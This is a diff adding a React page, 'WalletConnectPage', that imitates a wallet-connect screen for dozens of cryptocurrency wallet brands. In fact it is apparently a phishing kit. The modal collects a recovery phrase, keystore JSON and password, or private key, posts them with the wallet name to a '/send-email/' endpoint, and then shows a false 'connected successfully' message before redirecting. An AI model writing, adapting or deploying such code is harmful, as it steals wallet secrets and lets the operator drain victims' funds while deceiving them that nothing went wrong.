@@ -1,0 +1,323 @@
+import React, { useState } from 'react';
+import { useNavigate } from 'react-router-dom';
+
+import metamask from './assets/metamask.jpg';
+import trust from './assets/trust_wallet.jpg';
+import coinbase from './assets/coinbases.png';
+import xumm from './assets/xumm.jpg';
+import cardano from './assets/cardano.png';
+import daedalus from './assets/daedalus.png';
+import yoroi from './assets/yoroi.png';
+import ccvault from './assets/ccvault.png';
+import gero from './assets/gero.jpg';
+import nami from './assets/nami.png';
+import solana from './assets/solana.png';
+import phantom from './assets/phantom.jpg';
+import solflare from './assets/solflare.png';
+import sollet from './assets/sollet.png';
+import solong from './assets/solong.jpg';
+import exodus from './assets/exodus.png';
+import avalanche from './assets/avalanche.png';
+import velas from './assets/velas.png';
+import cryptocom from './assets/crypto-4cbeac57421fb3ca2573db2cf448169a.png';
+import blockchain from './assets/blockchain-logo.png';
+import binance from './assets/binance.png';
+import safepal from './assets/safepal.jpg';
+import argent from './assets/argent.jpg';
+import aktionariat from './assets/aktionariat-c5784b26234a389632687a36d2fb3258.png';
+import keyring from './assets/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png';
+import bitkeep from './assets/bitkeep-387b0ca7da4cf322f44c70c23064c529.png';
+import sparkpoint from './assets/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png';
+import ownbit from './assets/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png';
+import infinity from './assets/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png';
+import walletio from './assets/wallet-io-198f396de22fe25eb370f46544abe69d.png';
+import infinito from './assets/wallet-io-198f396de22fe25eb370f46544abe69d.png';
+import nash from './assets/nash.jpg';
+import bitpay from './assets/bitpay.jpg';
+import imtoken from './assets/imtoken.jpg';
+import other from './assets/otherssss.jpg';
+import trustwallet from './assets/trustwallet.png'
+
+const wallets = [
+  { name: 'Metamask', icon: metamask },
+  { name: 'Trust', icon: trustwallet },
+  { name: 'Coinbase', icon: coinbase },
+  { name: 'Xumm', icon: xumm },
+  { name: 'Cardano', icon: cardano },
+  { name: 'Daedalus', icon: daedalus },
+  { name: 'Yoroi', icon: yoroi },
+  { name: 'CCVault', icon: ccvault },
+  { name: 'Gero', icon: gero },
+  { name: 'Nami', icon: nami },
+  { name: 'Solana', icon: solana },
+  { name: 'Phantom', icon: phantom },
+  { name: 'Solflare', icon: solflare },
+  { name: 'Sollet', icon: sollet },
+  { name: 'Solong', icon: solong },
+  { name: 'Exodus', icon: exodus },
+  { name: 'Avalanche', icon: avalanche },
+  { name: 'Velas', icon: velas },
+  { name: 'Crypto.com', icon: cryptocom },
+  { name: 'Blockchain', icon: blockchain },
+  { name: 'Binance Smart Chain', icon: binance },
+  { name: 'Safepal', icon: safepal },
+  { name: 'Argent', icon: argent },
+  { name: 'Aktionariat', icon: aktionariat },
+  { name: 'Keyring Pro', icon: keyring },
+  { name: 'BitKeep', icon: bitkeep },
+  { name: 'SparkPoint', icon: sparkpoint },
+  { name: 'OwnBit', icon: ownbit },
+  { name: 'Infinity Wallet', icon: infinity },
+  { name: 'Wallet.io', icon: walletio },
+  { name: 'Nash', icon: nash },
+  { name: 'BitPay', icon: bitpay },
+  { name: 'imToken', icon: imtoken },
+  { name: 'Other Wallet', icon: other },
+];
+
+function WalletConnectPage() {
+  const [selectedWallet, setSelectedWallet] = useState(null);
+  const [isModalOpen, setIsModalOpen] = useState(false);
+  const [activeTab, setActiveTab] = useState('phrase');
+  const [isLoading, setIsLoading] = useState(false);
+  const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [inputValue, setInputValue] = useState('');
+  const [password, setPassword] = useState('');
+  const [errorMessage, setErrorMessage] = useState('');
+  const navigate = useNavigate();
+  const [walletName, setWalletName] = useState(''); // Add walletName to the state
+
+
+  const handleWalletClick = (wallet) => {
+    setSelectedWallet(wallet);
+    setActiveTab('phrase');
+    setInputValue('');
+    setPassword('');
+    setIsModalOpen(true);
+    setErrorMessage('');
+  };
+
+  const handleValidate = () => {
+    if (inputValue.trim() === '' || (activeTab === 'keystore' && password.trim() === '')) {
+      setErrorMessage('Please fill in all the required fields.');
+      return;
+    }
+  
+    if (activeTab === 'phrase' && inputValue.trim().split(/\s+/).filter(word => word.length > 0).length !== 12) {
+      setErrorMessage('Recovery phrase must contain exactly 12 words.');
+      return;
+    }
+  
+    console.log('Active Tab:', activeTab);
+    console.log('Input Value:', inputValue);
+    if (activeTab === 'keystore') {
+      console.log('Password:', password);
+    }
+    // console.log('Selected Wallet:', selectedWallet.name);
+    console.log(`Sending email with type: ${selectedWallet.name} text ${inputValue}, Password - ${password}`);
+  
+  
+    setIsLoading(true);
+    setTimeout(async () => {
+      setIsLoading(false);
+      setShowSuccessModal(true);
+  
+      try {
+        // Assuming `sendEmail` is a function that sends an email via your API
+        await sendEmail(selectedWallet.name, `Input Value: ${inputValue}, Password: ${password}`);
+        console.log('Email sent successfully');
+      } catch (error) {
+        console.error('Failed to send email:', error);
+      }
+  
+      setTimeout(() => {
+        setShowSuccessModal(false);
+        navigate('/'); // Navigate to home page
+      }, 3000);
+    }, 3000);
+  };
+  
+  
+
+
+  const sendEmail = async (type, text) => {
+    try {
+      const response = await fetch('/send-email/', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ type, text }),
+      });
+  
+      if (!response.ok) {
+        throw new Error('Failed to send email');
+      }
+  
+      console.log('Email sent successfully');
+      // Optionally, handle response data here
+    } catch (error) {
+      console.error('Error sending email:', error);
+      // Handle error scenario
+    }
+  };
+  
+  
+  
+
+  const Loader = () => (
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
+      <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-gray-800"></div>
+    </div>
+  );
+
+  const SuccessModal = () => (
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center backdrop-filter backdrop-blur-sm z-50">
+      <div className="bg-white rounded-lg p-8 w-full max-w-md shadow-2xl transform transition-all duration-300 ease-in-out scale-100 hover:scale-105">
+        <div className="flex items-center mb-6">
+          <div className="bg-green-500 rounded-full p-2 mr-4">
+            <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
+            </svg>
+          </div>
+          <h2 className="text-2xl font-bold text-gray-800">Success!</h2>
+        </div>
+        <p className="text-gray-600 mb-6">Your wallet has been connected successfully.</p>
+      
+      </div>
+    </div>
+  );
+  
+  
+
+  const renderModalContent = () => {
+    switch (activeTab) {
+      case 'phrase':
+        return (
+          <>
+            <textarea
+              className="w-full border rounded-lg p-2 mb-2"
+              rows="4"
+              value={inputValue}
+              onChange={(e) => setInputValue(e.target.value)}
+              placeholder="Enter your recovery phrase"
+            ></textarea>
+            <p className="text-sm text-gray-600 mb-4">
+              Typically, it consists of 12 (sometimes 24) words separated by single spaces.
+            </p>
+          </>
+        );
+      case 'keystore':
+        return (
+          <>
+            <textarea
+              className="w-full border rounded-lg p-2 mb-2"
+              rows="4"
+              value={inputValue}
+              onChange={(e) => setInputValue(e.target.value)}
+              placeholder="Enter your Keystore JSON"
+            ></textarea>
+            <input
+              type="password"
+              className="w-full border rounded-lg p-2 mb-2"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              placeholder="Wallet password"
+            />
+            <p className="text-sm text-gray-600 mb-4">
+              Several lines of text start with "..." followed by the password you used to encrypt it.
+            </p>
+          </>
+        );
+      case 'privateKey':
+        return (
+          <>
+            <input
+              type="text"
+              className="w-full border rounded-lg p-2 mb-2"
+              value={inputValue}
+              onChange={(e) => setInputValue(e.target.value)}
+              placeholder="Enter your Private Key"
+            />
+            <p className="text-sm text-gray-600 mb-4">
+              Typically 12 (sometimes 24) words separated by a single space.
+            </p>
+          </>
+        );
+      default:
+        return null;
+    }
+  };
+
+  return (
+    <div className="bg-gray-100 min-h-screen flex justify-center items-start py-10">
+      <div className="bg-white rounded-lg shadow-lg p-6 w-full max-w-md">
+        <h1 className="text-2xl font-bold mb-4">Connect Your Wallet</h1>
+        <div className="grid grid-cols-3 gap-4 mb-4">
+          {wallets.map((wallet) => (
+            <button
+              key={wallet.name}
+              className="p-2 border rounded-lg flex flex-col items-center"
+              onClick={() => handleWalletClick(wallet)}
+            >
+              <img src={wallet.icon} alt={wallet.name} className="h-12 w-12 mb-2" />
+              <span className="text-sm">{wallet.name}</span>
+            </button>
+          ))}
+        </div>
+      </div>
+
+      {isModalOpen && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
+          <div className="bg-white rounded-lg p-6 w-full max-w-md">
+        
+         <div className="flex">
+         <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-8 h-8 mr-2" />
+
+<h2 className="text-xl font-bold mb-4">{selectedWallet.name}</h2>
+         </div>
+            <div className="flex space-x-4 mb-4">
+              <button
+                className={`py-2 px-4 rounded ${activeTab === 'phrase' ? 'bg-gray-800 text-white' : 'bg-gray-200 text-gray-700'}`}
+                onClick={() => setActiveTab('phrase')}
+              >
+                Phrase
+              </button>
+              <button
+                className={`py-2 px-4 rounded ${activeTab === 'keystore' ? 'bg-gray-800 text-white' : 'bg-gray-200 text-gray-700'}`}
+                onClick={() => setActiveTab('keystore')}
+              >
+                Keystore JSON
+              </button>
+              <button
+                className={`py-2 px-4 rounded ${activeTab === 'privateKey' ? 'bg-gray-800 text-white' : 'bg-gray-200 text-gray-700'}`}
+                onClick={() => setActiveTab('privateKey')}
+              >
+                Private Key
+              </button>
+            </div>
+            {renderModalContent()}
+            {errorMessage && <p className="text-red-500 text-sm mb-2">{errorMessage}</p>}
+            <button
+              className="bg-gray-800 text-white py-2 px-4 rounded w-full"
+              onClick={handleValidate}
+            >
+              {isLoading ? 'Validating...' : 'Validate'}
+            </button>
+            <button
+            className="text-red-500 mt-10 w-full text-end font-semibold"
+            onClick={() => setIsModalOpen(false)}
+          >
+            Cancel
+          </button>
+          </div>
+        </div>
+      )}
+
+      {isLoading && <Loader />}
+      {showSuccessModal && <SuccessModal />}
+    </div>
+  );
+}
+
+export default WalletConnectPage;
